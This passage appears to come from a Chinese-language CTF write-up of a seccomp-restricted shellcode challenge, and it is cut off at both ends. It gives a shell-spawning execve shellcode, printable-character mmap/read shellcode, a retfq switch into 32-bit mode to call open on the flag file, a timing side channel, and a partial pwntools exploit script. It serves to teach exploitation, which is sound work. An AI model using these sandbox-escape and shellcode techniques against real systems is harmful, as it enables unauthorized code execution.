0x06 0x00 0x00000005  if (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><ul><li>IDA反编译程序，查看主函数，主程序是入读shellcode并执行：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, (<span class="keyword">unsigned</span> __int64)arg3, v2);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v5 = sys_read(<span class="number">0</span>, v4, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v4[(<span class="keyword">int</span>)v5 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[(<span class="keyword">int</span>)v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v6 = v5 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] &lt;= <span class="number">31</span> || v4[i] == <span class="number">127</span> )<span class="comment">// 限制读入的字符为可见字符串</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))v4)();<span class="comment">// 调用shellcode</span></span><br><span class="line">LABEL_10:</span><br><span class="line">  v8 = sys_exit_group(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li><p><code>retfq</code>指令的栈布局为：</p><ul><li><code>ret</code>（位于sp）：接下来要执行的地址。</li><li><code>set cs</code>（位于sp+4/8）：切换到64位系统下，参数值为0x33；切换到32位系统下，参数值为0x23。</li><li>需要的注意的是，在由64位变为32位后，rsp的值会变成非法值，故需先修复rsp的值在执行相应的代码（即<code>mov esp, 0x40404550</code>）。</li></ul></li></ul><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><ul><li>编写一个测试程序如下，并使用<code>gcc main.c -z execstack -o main</code>命令编译，编译为32位需加上<code>-m32</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用objdump打印出intel架构下的<code>main</code>函数，发现直接调用了链接库函数，这种方法行不通。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ objdump -M intel -d a.out | grep &#x27;&lt;main&gt;&#x27; -A 10</span><br><span class="line">0000000000400430 &lt;main&gt;:</span><br><span class="line">  400430:48 83 ec 08          sub    rsp,0x8</span><br><span class="line">  400434:31 d2                xor    edx,edx</span><br><span class="line">  400436:31 f6                xor    esi,esi</span><br><span class="line">  400438:bf d4 05 40 00       mov    edi,0x4005d4</span><br><span class="line">  40043d:e8 ce ff ff ff       call   400410 &lt;execve@plt&gt;</span><br><span class="line">  400442:31 c0                xor    eax,eax</span><br><span class="line">  400444:48 83 c4 08          add    rsp,0x8</span><br><span class="line">  400448:c3                   ret    </span><br><span class="line">  400449:0f 1f 80 00 00 00 00 nop    DWORD PTR [rax+0x0]</span><br></pre></td></tr></table></figure><ul><li>gdb反汇编execve函数的代码：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble execve</span><br><span class="line">Dump of assembler code for function execve:</span><br><span class="line">   0x00007ffff78937f0 &lt;+0&gt;:mov    eax,0x3b</span><br><span class="line">   0x00007ffff78937f5 &lt;+5&gt;:syscall </span><br><span class="line">   0x00007ffff78937f7 &lt;+7&gt;:cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x00007ffff78937fd &lt;+13&gt;:jae    0x7ffff7893800 &lt;execve+16&gt;</span><br><span class="line">   0x00007ffff78937ff &lt;+15&gt;:ret</span><br></pre></td></tr></table></figure><ul><li>仿照上面写出代码（将字符串<code>/bin/sh\x00</code>压栈之后，又把栈地址赋值给rdi）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, 0</span><br><span class="line">mov rsi, 0</span><br><span class="line">mov rdi, 0x68732f6e69622f </span><br><span class="line">push rdi</span><br><span class="line">mov rdi, rsp</span><br><span class="line">mov eax, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><ul><li>优化选项（长度为0xc）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov al, 59</span><br><span class="line">push rbx</span><br><span class="line">push rbx</span><br><span class="line">pop rsi</span><br><span class="line">pop rdx</span><br><span class="line">mov rdi, 0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h4 id="继续题解"><a href="#继续题解" class="headerlink" title="继续题解"></a>继续题解</h4><ul><li>查看32位和64位的系统调用号：<br><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a></li></ul><table><thead><tr><th align="center">系统调用号</th><th align="center">x86</th><th align="center">x64</th></tr></thead><tbody><tr><td align="center">5</td><td align="center">open</td><td align="center">fstat</td></tr><tr><td align="center">37</td><td align="center">kill</td><td align="center">alarm</td></tr><tr><td align="center">4</td><td align="center">write</td><td align="center">stat</td></tr><tr><td align="center">0</td><td align="center">restart_syscall</td><td align="center">read</td></tr><tr><td align="center">9</td><td align="center">link</td><td align="center">mmap</td></tr><tr><td align="center">231</td><td align="center">fgetxattr</td><td align="center">exit_group</td></tr></tbody></table><ul><li><code>mmap</code>调用 的shellcode：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">code_mmap = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   <span class="comment">/*mov rdi, 0x40404040*/</span></span><br><span class="line">   push <span class="number">0x40404040</span></span><br><span class="line">   pop rdi</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rsi, 0x7e*/</span></span><br><span class="line">   push <span class="number">0x7e</span></span><br><span class="line">   pop rsi</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rdx, 0x7*/</span></span><br><span class="line">   push <span class="number">0x37</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line">   push rax</span><br><span class="line">   pop rdx</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov r8, 0*/</span></span><br><span class="line">   push <span class="number">0x30</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line">   push rax</span><br><span class="line">   pop r8</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov r9, 0*/</span></span><br><span class="line">   push rax</span><br><span class="line">   pop r9</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*syscall*/</span></span><br><span class="line">   push <span class="number">0x5e</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx+<span class="number">0x2c</span>], cl</span><br><span class="line">   push <span class="number">0x5c</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx+<span class="number">0x2d</span>], cl</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rax, 0x9*/</span></span><br><span class="line">   push <span class="number">0x39</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>read</code>调用的shellcode：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">code_read = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   <span class="comment">/*mov rsi, 0x40404040*/</span></span><br><span class="line">   push <span class="number">0x40404040</span></span><br><span class="line">   pop rsi</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rdi, 0*/</span></span><br><span class="line">   push <span class="number">0x30</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line">   push rax</span><br><span class="line">   pop rdi</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rdx, 0x7e*/</span></span><br><span class="line">   push <span class="number">0x7e</span></span><br><span class="line">   pop rdx</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*mov rax, 0*/</span></span><br><span class="line">   push <span class="number">0x30</span></span><br><span class="line">   pop rax</span><br><span class="line">   <span class="keyword">xor</span> al, <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/*syscall*/</span></span><br><span class="line">   push <span class="number">0x5e</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx+<span class="number">0x4f</span>], cl</span><br><span class="line">   push <span class="number">0x5c</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx+<span class="number">0x50</span>], cl</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>retfq</code>指令的shellcode：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">code_retfq = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   <span class="comment">/* 算出0x48 */</span></span><br><span class="line">   push <span class="number">0x39</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx + <span class="number">0x71</span>], cl</span><br><span class="line">   push <span class="number">0x20</span></span><br><span class="line">   pop rcx</span><br><span class="line">   <span class="keyword">xor</span> byte ptr [rbx + <span class="number">0x71</span>], cl</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 利用无借位减法算出0xcb</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   push <span class="number">0x47</span></span><br><span class="line">   pop rcx</span><br><span class="line">   sub byte ptr [rbx + <span class="number">0x72</span>], cl</span><br><span class="line">   sub byte ptr [rbx + <span class="number">0x72</span>], cl</span><br><span class="line">   push rdi</span><br><span class="line">   push rdi</span><br><span class="line">   push <span class="number">0x23</span></span><br><span class="line">   push <span class="number">0x40404040</span></span><br><span class="line">   pop rax</span><br><span class="line">   push rax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>open</code>调用的shellcode（32位下）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">code_open = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   <span class="comment">/* open函数 */</span></span><br><span class="line">   mov esp, <span class="number">0x40404550</span></span><br><span class="line">   push <span class="number">0x67616c66</span><span class="comment">/* flag */</span></span><br><span class="line">   mov ebx, esp</span><br><span class="line">   <span class="keyword">xor</span> ecx, ecx</span><br><span class="line">   <span class="keyword">xor</span> edx, edx</span><br><span class="line">   mov eax, <span class="number">0x5</span></span><br><span class="line">   <span class="keyword">int</span> <span class="number">0x80</span></span><br><span class="line">   mov ecx, eax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>retfq</code>从32位转回64位的shellcode：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code_retfq_1 = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line">   <span class="comment">/* retfq */</span></span><br><span class="line">   push <span class="number">0x33</span></span><br><span class="line">   push <span class="number">0x40404062</span> <span class="comment">/* 具体数字有待修改 */</span></span><br><span class="line">   retfq</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>read</code>的shellcode（64位下）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code_read = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   mov rdi,rcx</span><br><span class="line">   mov rsi,rsp</span><br><span class="line">   mov rdx,<span class="number">0x70</span></span><br><span class="line">   <span class="keyword">xor</span> rax,rax</span><br><span class="line">   syscall</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>append的shelllcode（64位下）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code_append = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   push rcx</span><br><span class="line">   pop rcx</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>append的shelllcode（32位下）：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code_append_x86 = <span class="keyword">asm</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   push ebx</span><br><span class="line">   pop ebx</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>侧信道攻击：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> index == <span class="number">0</span>:</span><br><span class="line">   shellcode_flag += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;</span>.<span class="built_in">format</span>(index, ch)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   shellcode_flag += <span class="string">&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(index, ch)</span><br></pre></td></tr></table></figure><ul><li>最后形成脚本（注意自己调用<code>read</code>的时候是不需要使用可见字符的shellcode的）：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">code_append = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   push rcx</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_append_x86 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   push ebx</span></span><br><span class="line"><span class="string">   pop ebx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_mmap = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /*mov rdi, 0x40404040*/</span></span><br><span class="line"><span class="string">   push 0x40404040</span></span><br><span class="line"><span class="string">   pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rsi, 0x7e*/</span></span><br><span class="line"><span class="string">   push 0x7e</span></span><br><span class="line"><span class="string">   pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rdx, 0x7*/</span></span><br><span class="line"><span class="string">   push 0x37</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">   pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov r8, 0*/</span></span><br><span class="line"><span class="string">   push 0x30</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">   pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov r9, 0*/</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">   pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*syscall*/</span></span><br><span class="line"><span class="string">   push 0x5e</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx+0x2c], cl</span></span><br><span class="line"><span class="string">   push 0x5c</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx+0x2d], cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rax, 0x9*/</span></span><br><span class="line"><span class="string">   push 0x39</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_read = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /*mov rsi, 0x40404040*/</span></span><br><span class="line"><span class="string">   push 0x40404040</span></span><br><span class="line"><span class="string">   pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rdi, 0*/</span></span><br><span class="line"><span class="string">   push 0x30</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string">   push rax</span></span><br><span class="line"><span class="string">   pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rdx, 0x7e*/</span></span><br><span class="line"><span class="string">   push 0x7e</span></span><br><span class="line"><span class="string">   pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*mov rax, 0*/</span></span><br><span class="line"><span class="string">   push 0x30</span></span><br><span class="line"><span class="string">   pop rax</span></span><br><span class="line"><span class="string">   xor al, 0x30</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   /*syscall*/</span></span><br><span class="line"><span class="string">   push 0x5e</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx+0x4f], cl</span></span><br><span class="line"><span class="string">   push 0x5c</span></span><br><span class="line"><span class="string">   pop rcx</span></span><br><span class="line"><span class="string">   xor byte ptr [rbx+0x50], cl</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_retfq = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* 算出0x48 */</span></span><br><span class="line"><span class="string">   push 